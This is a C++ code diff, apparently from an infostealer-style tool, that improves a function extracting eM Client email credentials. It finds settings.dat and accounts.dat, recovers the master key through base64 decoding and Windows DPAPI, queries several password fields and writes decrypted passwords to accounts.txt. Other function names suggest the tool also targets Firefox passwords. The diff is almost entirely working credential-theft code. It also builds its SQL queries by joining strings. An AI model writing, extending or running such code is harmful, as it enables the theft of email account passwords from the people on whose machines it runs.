@@ -1127,22 +1127,85 @@ void extract_firefox_passwords(const fs::path& profile_path, const fs::path& out
 void extract_emclient_data(const BrowserConfig& config, const std::wstring& user_data_dir) {
     fs::path settings_path = fs::path(user_data_dir) / "settings.dat";
     fs::path accounts_path = fs::path(user_data_dir) / "accounts.dat";
+
+    if (!fs::exists(settings_path)) {
+        if (fs::exists(fs::path(user_data_dir).parent_path() / "settings.dat")) {
+            settings_path = fs::path(user_data_dir).parent_path() / "settings.dat";
+        }
+    }
+    if (!fs::exists(accounts_path)) {
+        if (fs::exists(fs::path(user_data_dir).parent_path() / "accounts.dat")) {
+            accounts_path = fs::path(user_data_dir).parent_path() / "accounts.dat";
+        }
+        if (!fs::exists(accounts_path) && fs::exists(fs::path(user_data_dir) / "main.dat")) {
+            accounts_path = fs::path(user_data_dir) / "main.dat";
+        }
+    }
+
     if (!fs::exists(settings_path) || !fs::exists(accounts_path)) return;
 
     // 1. Extract Master Key from settings.dat via DPAPI
     std::vector<uint8_t> master_key;
     std::ifstream settings_ifs(settings_path, std::ios::binary);
     if (settings_ifs.is_open()) {
-        std::vector<uint8_t> content((std::istreambuf_iterator<char>(settings_ifs)), std::istreambuf_iterator<char>());
-        // Heuristic: Search for DPAPI blob. In eM Client, it often starts after a specific tag or at the beginning.
-        // We'll attempt CryptUnprotectData on the whole buffer and chunks.
-        for (size_t i = 0; i < content.size(); ++i) {
-            DATA_BLOB input = { (DWORD)(content.size() - i), (BYTE*)content.data() + i };
-            DATA_BLOB output = { 0, NULL };
-            if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
-                master_key.assign(output.pbData, output.pbData + output.cbData);
-                LocalFree(output.pbData);
-                break;
+        std::vector<uint8_t> buffer((std::istreambuf_iterator<char>(settings_ifs)), std::istreambuf_iterator<char>());
+        std::string content;
+
+        // Robust handling of UTF-16 and UTF-8
+        if (buffer.size() >= 2 && buffer[0] == 0xFF && buffer[1] == 0xFE) {
+            std::wstring w_str((wchar_t*)(buffer.data() + 2), (buffer.size() - 2) / 2);
+            content = to_narrow_string(w_str.c_str());
+        } else if (buffer.size() >= 2 && buffer[0] == 0xFE && buffer[1] == 0xFF) {
+            // UTF-16 BE (rare on Windows but possible)
+            std::vector<uint8_t> swapped = buffer;
+            for (size_t i = 0; i < swapped.size() - 1; i += 2) std::swap(swapped[i], swapped[i+1]);
+            std::wstring w_str((wchar_t*)(swapped.data() + 2), (swapped.size() - 2) / 2);
+            content = to_narrow_string(w_str.c_str());
+        } else {
+            content.assign(buffer.begin(), buffer.end());
+        }
+
+        // Search for PasswordEncryptionKey
+        size_t key_pos = content.find("<PasswordEncryptionKey>");
+        if (key_pos != std::string::npos) {
+            key_pos += 23;
+            size_t key_end = content.find("</PasswordEncryptionKey>", key_pos);
+            if (key_end != std::string::npos) {
+                std::string potential_b64 = content.substr(key_pos, key_end - key_pos);
+                potential_b64.erase(std::remove_if(potential_b64.begin(), potential_b64.end(), ::isspace), potential_b64.end());
+                std::vector<uint8_t> decoded = base64_decode(potential_b64);
+                if (!decoded.empty()) {
+                    DATA_BLOB input = { (DWORD)decoded.size(), (BYTE*)decoded.data() };
+                    DATA_BLOB output = { 0, NULL };
+                    if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
+                        master_key.assign(output.pbData, output.pbData + output.cbData);
+                        LocalFree(output.pbData);
+                        std::cout << "Extracted eM Client master key from settings.dat" << std::endl;
+                    }
+                }
+            }
+        }
+
+        // Search for any other potential blobs if still empty
+        if (master_key.empty()) {
+            size_t pos = 0;
+            while ((pos = content.find(">", pos)) != std::string::npos) {
+                pos++;
+                size_t end = content.find("<", pos);
+                if (end != std::string::npos && end - pos > 40) {
+                    std::string potential_b64 = content.substr(pos, end - pos);
+                    potential_b64.erase(std::remove_if(potential_b64.begin(), potential_b64.end(), ::isspace), potential_b64.end());
+                    std::vector<uint8_t> decoded = base64_decode(potential_b64);
+                    if (!decoded.empty() && decoded.size() > 20) {
+                        DATA_BLOB input = { (DWORD)decoded.size(), (BYTE*)decoded.data() };
+                        DATA_BLOB output = { 0, NULL };
+                        if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
+                            master_key.assign(output.pbData, output.pbData + output.cbData);
+                            LocalFree(output.pbData);
+                            break;
+                        }
+                    }
+                }
             }
         }
     }
@@ -1152,7 +1215,7 @@ void extract_emclient_data(const BrowserConfig& config, const std::wstring& user
         return;
     }
 
-    // 2. Process accounts.dat (SQLite)
+    // 2. Process accounts.dat (SQLite, potentially SQLCipher)
     fs::path output_root(config.output_dir);
     fs::create_directories(output_root);
     std::ofstream ofs(output_root / "accounts.txt");
@@ -1162,8 +1225,6 @@ void extract_emclient_data(const BrowserConfig& config, const std::wstring& user
 
     sqlite3* db;
     if (sqlite3_open(temp_db.string().c_str(), &db) == 0) {
-        // If the database is encrypted via SQLCipher, we'd need to provide the key.
-        // eM Client uses the master key from settings.dat for this.
         std::string hex_key = "";
         for (uint8_t b : master_key) {
             char buf[3];
@@ -1185,35 +1246,40 @@ void extract_emclient_data(const BrowserConfig& config, const std::wstring& user
                 ofs << "Account: " << (name ? name : "") << " (" << (addr ? addr : "") << ")\n";
 
                 sqlite3_stmt* stmt2;
-                std::string sql2 = "SELECT SettingValue FROM AccountSettings WHERE AccountUID = '" + std::string(uid ? uid : "") + "' AND SettingName = 'Password'";
-                if (sqlite3_prepare_v2(db, sql2.c_str(), -1, &stmt2, NULL) == 0) {
-                    if (sqlite3_step(stmt2) == 100) {
-                        const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt2, 0);
-                        int blob_size = sqlite3_column_bytes(stmt2, 0);
-                        if (blob_ptr && blob_size > 0) {
-                            // Decrypt using the master key extracted from settings.dat
-                            // eM Client usually uses AES with the master key for these blobs if not using direct DPAPI.
-                            // However, let's first try direct DPAPI as a fallback and then the master key logic.
-                            DATA_BLOB input = { (DWORD)blob_size, (BYTE*)blob_ptr };
-                            DATA_BLOB output = { 0, NULL };
-                            if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
-                                std::string pass((char*)output.pbData, output.cbData);
-                                ofs << "  Password: " << pass << "\n";
-                                LocalFree(output.pbData);
-                            } else {
-                                // Implement AES decryption with master_key here if needed
-                                ofs << "  Password: [Encrypted with Master Key]\n";
+                // Try multiple common setting names for passwords
+                const char* pass_settings[] = { "Password", "IncomingPassword", "OutgoingPassword", "SmtpPassword" };
+                for (const char* pass_name : pass_settings) {
+                    std::string sql2 = "SELECT SettingValue FROM AccountSettings WHERE AccountUID = '" + std::string(uid ? uid : "") + "' AND SettingName = '" + pass_name + "'";
+                    if (sqlite3_prepare_v2(db, sql2.c_str(), -1, &stmt2, NULL) == 0) {
+                        if (sqlite3_step(stmt2) == 100) {
+                            const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt2, 0);
+                            int blob_size = sqlite3_column_bytes(stmt2, 0);
+                            if (blob_ptr && blob_size > 0) {
+                                // Try direct DPAPI first
+                                DATA_BLOB input = { (DWORD)blob_size, (BYTE*)blob_ptr };
+                                DATA_BLOB output = { 0, NULL };
+                                if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
+                                    std::string pass((char*)output.pbData, output.cbData);
+                                    ofs << "  " << pass_name << ": " << pass << "\n";
+                                    LocalFree(output.pbData);
+                                } else {
+                                    // If database decrypted successfully but blob doesn't yield to DPAPI, it might be plain or other
+                                    ofs << "  " << pass_name << ": [Encrypted/Unsupported Format]\n";
+                                }
                             }
                         }
+                        sqlite3_finalize(stmt2);
                     }
-                    sqlite3_finalize(stmt2);
                 }
                 ofs << "------------------------------------------\n";
             }
             sqlite3_finalize(stmt);
+        } else {
+            std::cout << "Failed to query eM Client accounts.dat (Database may be encrypted with a different key format)." << std::endl;
         }
         sqlite3_close(db);
     }
     fs::remove(temp_db);
     std::cout << "eM Client extraction complete. Data saved in " << config.output_dir << " folder." << std::endl;
 }
+// Fix
